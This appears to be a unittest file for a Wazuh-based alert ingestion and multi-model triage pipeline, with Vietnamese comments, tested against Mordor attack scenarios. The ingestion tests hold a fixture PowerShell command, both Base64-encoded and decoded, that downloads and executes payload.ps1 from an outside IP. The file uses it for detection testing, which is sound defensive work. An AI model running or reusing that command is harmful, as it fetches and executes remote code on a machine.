# -*- coding: utf-8 -*-
"""
tests/test_ingestion_triage.py
Bộ kiểm thử toàn diện cho Ingestion Tool, Ingestion Agent và Detection & Triage Agent.
Bao gồm:
1. Kiểm thử WazuhAlertStreamer (Stream, Batch, Filter theo level, group, agent).
2. Kiểm thử IngestionAgent (Bóc tách ParsedEvent, giải mã Base64 PowerShell, trích xuất IoCs sơ bộ, tạo IncidentState).
3. Kiểm thử TriageAgent với cơ chế gọi song song 3 models (Model A, B, C) qua ThreadPoolExecutor.
4. Kiểm thử độ chính xác 100% trên 4 kịch bản Mordor (Scenario 1, 2, 3: True Positive; Scenario 4: False Positive).
5. Đo lường hiệu năng thực thi song song (Parallel execution latency).
"""

import os
import time
import json
import tempfile
import unittest

from src.core.schemas import (
    SeverityLevel,
    IncidentStatus,
    TriageOutput,
    ParsedEvent,
    WazuhAlert,
    AttackCategory
)
from src.core.state import IncidentState
from src.tools.wazuh_stream import WazuhAlertStreamer
from src.agents.ingestion_agent import IngestionAgent
from src.agents.triage_agent import TriageAgent
from src.agents.prompts import (
    INGESTION_AGENT_SYSTEM_PROMPT,
    TRIAGE_AGENT_SYSTEM_PROMPT
)


class TestWazuhAlertStreamer(unittest.TestCase):
    """Kiểm thử công cụ stream và batch cảnh báo Wazuh."""

    @classmethod
    def setUpClass(cls):
        cls.base_data_dir = os.path.join(os.path.dirname(__file__), "..", "data", "raw", "wazuh")
        cls.scenario2_path = os.path.join(cls.base_data_dir, "wazuh_alerts_scenario2_malware.json")
        cls.scenario4_path = os.path.join(cls.base_data_dir, "wazuh_alerts_scenario4_benign.json")

    def test_stream_all_alerts(self):
        streamer = WazuhAlertStreamer.from_file(self.scenario2_path)
        alerts = streamer.get_all_alerts()
        self.assertEqual(len(alerts), 4)
        self.assertEqual(streamer.count(), 4)
        for a in alerts:
            self.assertIsInstance(a, WazuhAlert)

    def test_filter_by_min_level(self):
        # Lọc rule level >= 10
        streamer = WazuhAlertStreamer.from_file(self.scenario2_path, min_level=10)
        alerts = streamer.get_all_alerts()
        self.assertEqual(len(alerts), 2)
        for a in alerts:
            self.assertGreaterEqual(a.rule.level, 10)

    def test_filter_by_max_level(self):
        # Lọc rule level <= 8
        streamer = WazuhAlertStreamer.from_file(self.scenario2_path, max_level=8)
        alerts = streamer.get_all_alerts()
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].rule.id, "92218")
        self.assertEqual(alerts[0].rule.level, 8)

    def test_filter_by_group(self):
        # Lọc theo group 'sysmon'
        streamer = WazuhAlertStreamer.from_file(self.scenario2_path, groups=["sysmon"])
        alerts = streamer.get_all_alerts()
        self.assertEqual(len(alerts), 4)

        # Lọc group không tồn tại
        streamer_empty = WazuhAlertStreamer.from_file(self.scenario2_path, groups=["non_existent_group"])
        self.assertEqual(len(streamer_empty.get_all_alerts()), 0)

    def test_filter_by_agent(self):
        streamer = WazuhAlertStreamer.from_file(self.scenario2_path, agent_id="002", agent_name="WIN10-VICTIM-01")
        alerts = streamer.get_all_alerts()
        self.assertEqual(len(alerts), 4)

        streamer_wrong = WazuhAlertStreamer.from_file(self.scenario2_path, agent_id="999")
        self.assertEqual(len(streamer_wrong.get_all_alerts()), 0)

    def test_batching(self):
        streamer = WazuhAlertStreamer.from_file(self.scenario2_path)
        batches = list(streamer.batch_alerts(batch_size=2))
        self.assertEqual(len(batches), 2)
        self.assertEqual(len(batches[0]), 2)
        self.assertEqual(len(batches[1]), 2)

    def test_ndjson_streaming(self):
        # Tạo file NDJSON tạm thời
        alerts_data = [
            {"id": "1", "rule": {"id": "101", "level": 5, "description": "Alert 1"}, "agent": {"id": "001", "name": "srv1"}},
            {"id": "2", "rule": {"id": "102", "level": 12, "description": "Alert 2"}, "agent": {"id": "002", "name": "srv2"}}
        ]
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".json") as tmp:
            for item in alerts_data:
                tmp.write(json.dumps(item) + "\n")
            tmp_path = tmp.name

        try:
            streamer = WazuhAlertStreamer.from_file(tmp_path, min_level=10)
            filtered = streamer.get_all_alerts()
            self.assertEqual(len(filtered), 1)
            self.assertEqual(filtered[0].id, "2")
        finally:
            os.remove(tmp_path)


class TestIngestionAgent(unittest.TestCase):
    """Kiểm thử IngestionAgent tiếp nhận, bóc tách và giải mã."""

    @classmethod
    def setUpClass(cls):
        cls.agent = IngestionAgent()
        cls.base_data_dir = os.path.join(os.path.dirname(__file__), "..", "data", "raw", "wazuh")

    def test_agent_prompt(self):
        self.assertEqual(self.agent.system_prompt, INGESTION_AGENT_SYSTEM_PROMPT)

    def test_decode_base64_powershell(self):
        # Base64 UTF-16LE payload trong Scenario 2
        cmd = (
            "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
        )
        decoded = self.agent.decode_base64_command(cmd)
        self.assertIsNotNone(decoded)
        self.assertEqual(
            decoded,
            "IEX (New-Object Net.WebClient).DownloadString('http://194.26.29.112/payload.ps1')"
        )

    def test_extract_preliminary_iocs(self):
        evt = ParsedEvent(
            event_id="Test-1",
            source_type="Sysmon",
            source_ip="192.168.1.105",
            dest_ip="194.26.29.112",
            file_hash="SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
            command_line="powershell.exe -enc test"
        )
        decoded = "IEX (New-Object Net.WebClient).DownloadString('http://194.26.29.112/payload.ps1')"
        iocs = self.agent.extract_preliminary_iocs(evt, decoded)

        # Kiểm tra IP public và private
        ip_values = [i["value"] for i in iocs if i["type"] == "IP"]
        self.assertIn("192.168.1.105", ip_values)
        self.assertIn("194.26.29.112", ip_values)

        pub_ips = [i["value"] for i in iocs if i["type"] == "IP" and i.get("is_public")]
        self.assertIn("194.26.29.112", pub_ips)
        self.assertNotIn("192.168.1.105", pub_ips)

        # Kiểm tra URL
        url_values = [i["value"] for i in iocs if i["type"] == "URL"]
        self.assertIn("http://194.26.29.112/payload.ps1", url_values)

        # Kiểm tra SHA256 Hash
        hash_values = [i["value"] for i in iocs if i["type"] == "SHA256"]
        self.assertIn("2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91", hash_values)

    def test_process_mordor_scenario2_malware(self):
        fpath = os.path.join(self.base_data_dir, "wazuh_alerts_scenario2_malware.json")
        state = self.agent.process(fpath)

        self.assertIsInstance(state, IncidentState)
        self.assertEqual(state.status, IncidentStatus.NEW)
        self.assertTrue(state.incident_id.startswith("INC-WAZUH-"))
        self.assertEqual(len(state.parsed_events), 4)
        self.assertEqual(len(state.raw_logs), 4)

        # Kiểm tra event 1 được giải mã và bóc tách
        first_evt = state.parsed_events[0]
        self.assertEqual(first_evt.process_name, "powershell.exe")
        self.assertIn("decoded_command", first_evt.raw_attributes)
        self.assertIn("194.26.29.112", first_evt.raw_attributes["decoded_command"])
        self.assertIn("preliminary_iocs", first_evt.raw_attributes)

    def test_process_mordor_scenario4_benign(self):
        fpath = os.path.join(self.base_data_dir, "wazuh_alerts_scenario4_benign.json")
        state = self.agent.process(fpath)

        self.assertIsInstance(state, IncidentState)
        self.assertEqual(state.status, IncidentStatus.NEW)
        self.assertEqual(len(state.parsed_events), 1)
        self.assertEqual(state.parsed_events[0].user_name, "truongdo")


class TestTriageAgent(unittest.TestCase):
    """Kiểm thử TriageAgent với cơ chế gọi song song đa mô hình (Parallel Multi-Model Ensemble)."""

    @classmethod
    def setUpClass(cls):
        cls.ingestion = IngestionAgent()
        cls.triage = TriageAgent()
        cls.base_data_dir = os.path.join(os.path.dirname(__file__), "..", "data", "raw", "wazuh")

    def test_agent_prompt(self):
        self.assertEqual(self.triage.system_prompt, TRIAGE_AGENT_SYSTEM_PROMPT)

    def test_parallel_models_execution(self):
        fpath = os.path.join(self.base_data_dir, "wazuh_alerts_scenario2_malware.json")
        state = self.ingestion.process(fpath)

        results = self.triage.evaluate_models_parallel(state.parsed_events)
        self.assertIn("model_a", results)
        self.assertIn("model_b", results)
        self.assertIn("model_c", results)
        self.assertIn("consensus", results)

        # Kiểm tra Model A Heuristic
        res_a = results["model_a"]
        self.assertEqual(res_a["model"], "Model-A-Heuristic")
        self.assertTrue(res_a["is_incident"])
        self.assertEqual(res_a["severity"], SeverityLevel.CRITICAL)

        # Kiểm tra Model B LLM CoT
        res_b = results["model_b"]
        self.assertEqual(res_b["model"], "Model-B-LLM-CoT")
        self.assertTrue(res_b["is_incident"])
        self.assertEqual(res_b["severity"], SeverityLevel.CRITICAL)
        self.assertIn("observation", res_b["cot_steps"])
        self.assertIn("contextualization", res_b["cot_steps"])
        self.assertIn("risk_scoring", res_b["cot_steps"])
        self.assertIn("conclusion", res_b["cot_steps"])

        # Kiểm tra Model C MITRE & IoC
        res_c = results["model_c"]
        self.assertEqual(res_c["model"], "Model-C-MITRE-IoC")
        self.assertTrue(res_c["is_incident"])
        self.assertIn("T1059.001", res_c["mitre_techniques"])

        # Kiểm tra Consensus
        consensus: TriageOutput = results["consensus"]
        self.assertEqual(consensus.rule_or_model, "Parallel-Ensemble-v1")
        self.assertTrue(consensus.is_incident)
        self.assertEqual(consensus.severity, SeverityLevel.CRITICAL)
        self.assertGreaterEqual(consensus.confidence_score, 0.85)

    def test_mordor_scenario1_phishing_true_positive(self):
        """Scenario 1: Password Spraying & Credential Access -> True Positive (CRITICAL/HIGH)."""
        fpath = os.path.join(self.base_data_dir, "wazuh_alerts_scenario1_phishing.json")
        state = self.ingestion.process(fpath)
        state = self.triage.process(state)

        triage_out = state.triage_result
        self.assertIsNotNone(triage_out)
        self.assertTrue(triage_out.is_incident, "Scenario 1 Phishing phải được phân loại là True Positive (is_incident=True)")
        self.assertIn(triage_out.severity, [SeverityLevel.HIGH, SeverityLevel.CRITICAL])
        self.assertGreaterEqual(triage_out.confidence_score, 0.85)
        self.assertEqual(triage_out.rule_or_model, "Parallel-Ensemble-v1")
        self.assertEqual(triage_out.attack_category, AttackCategory.CREDENTIAL_ACCESS)
        self.assertEqual(triage_out.attack_type, "Password Spraying & Credential Theft")
        self.assertEqual(state.attack_type, "Password Spraying & Credential Theft")
        self.assertEqual(state.status, IncidentStatus.TRIAGED)

    def test_mordor_scenario2_malware_true_positive(self):
        """Scenario 2: PowerShell Encoded C2 & Persistence -> True Positive (CRITICAL)."""
        fpath = os.path.join(self.base_data_dir, "wazuh_alerts_scenario2_malware.json")
        state = self.ingestion.process(fpath)
        state = self.triage.process(state)

        triage_out = state.triage_result
        self.assertIsNotNone(triage_out)
        self.assertTrue(triage_out.is_incident, "Scenario 2 Malware phải được phân loại là True Positive (is_incident=True)")
        self.assertEqual(triage_out.severity, SeverityLevel.CRITICAL)
        self.assertGreaterEqual(triage_out.confidence_score, 0.90)
        self.assertEqual(triage_out.rule_or_model, "Parallel-Ensemble-v1")
        self.assertEqual(triage_out.attack_category, AttackCategory.MALWARE)
        self.assertEqual(triage_out.attack_type, "Endpoint Malware & C2 Reverse Shell")
        self.assertEqual(state.attack_type, "Endpoint Malware & C2 Reverse Shell")
        self.assertEqual(state.status, IncidentStatus.TRIAGED)

    def test_mordor_scenario3_network_scan_true_positive(self):
        """Scenario 3: Port Scan & Reconnaissance -> True Positive (MEDIUM/HIGH)."""
        fpath = os.path.join(self.base_data_dir, "wazuh_alerts_scenario3_network_scan.json")
        state = self.ingestion.process(fpath)
        state = self.triage.process(state)

        triage_out = state.triage_result
        self.assertIsNotNone(triage_out)
        self.assertTrue(triage_out.is_incident, "Scenario 3 Network Scan phải được phân loại là True Positive (is_incident=True)")
        self.assertIn(triage_out.severity, [SeverityLevel.MEDIUM, SeverityLevel.HIGH])
        self.assertGreaterEqual(triage_out.confidence_score, 0.80)
        self.assertEqual(triage_out.rule_or_model, "Parallel-Ensemble-v1")
        self.assertEqual(triage_out.attack_category, AttackCategory.RECONNAISSANCE)
        self.assertEqual(triage_out.attack_type, "Network Scanning & Service Discovery")
        self.assertEqual(state.attack_type, "Network Scanning & Service Discovery")
        self.assertEqual(state.status, IncidentStatus.TRIAGED)

    def test_mordor_scenario4_benign_false_positive(self):
        """Scenario 4: Routine User Logon -> False Positive (LOW, is_incident=False)."""
        fpath = os.path.join(self.base_data_dir, "wazuh_alerts_scenario4_benign.json")
        state = self.ingestion.process(fpath)
        state = self.triage.process(state)

        triage_out = state.triage_result
        self.assertIsNotNone(triage_out)
        self.assertFalse(triage_out.is_incident, "Scenario 4 Benign phải được phân loại là False Positive (is_incident=False)")
        self.assertEqual(triage_out.severity, SeverityLevel.LOW)
        self.assertGreaterEqual(triage_out.confidence_score, 0.85)
        self.assertEqual(triage_out.rule_or_model, "Parallel-Ensemble-v1")
        self.assertEqual(triage_out.attack_category, AttackCategory.BENIGN)
        self.assertEqual(triage_out.attack_type, "Normal Administrative Activity (Benign)")
        self.assertEqual(state.attack_type, "Normal Administrative Activity (Benign)")
        self.assertEqual(state.status, IncidentStatus.CLOSED_FALSE_POSITIVE)

    def test_parallel_execution_latency(self):
        """Kiểm tra độ trễ thực thi song song của 3 models đảm bảo đáp ứng thời gian thực (< 100ms)."""
        fpath = os.path.join(self.base_data_dir, "wazuh_alerts_scenario2_malware.json")
        state = self.ingestion.process(fpath)

        start_time = time.perf_counter()
        _ = self.triage.evaluate_models_parallel(state.parsed_events)
        elapsed_ms = (time.perf_counter() - start_time) * 1000.0

        print(f"\n[BENCHMARK] Parallel Ensemble Triage Latency: {elapsed_ms:.2f} ms")
        self.assertLess(elapsed_ms, 200.0, "Thời gian thực thi song song phải dưới 200ms")


if __name__ == "__main__":
    unittest.main()
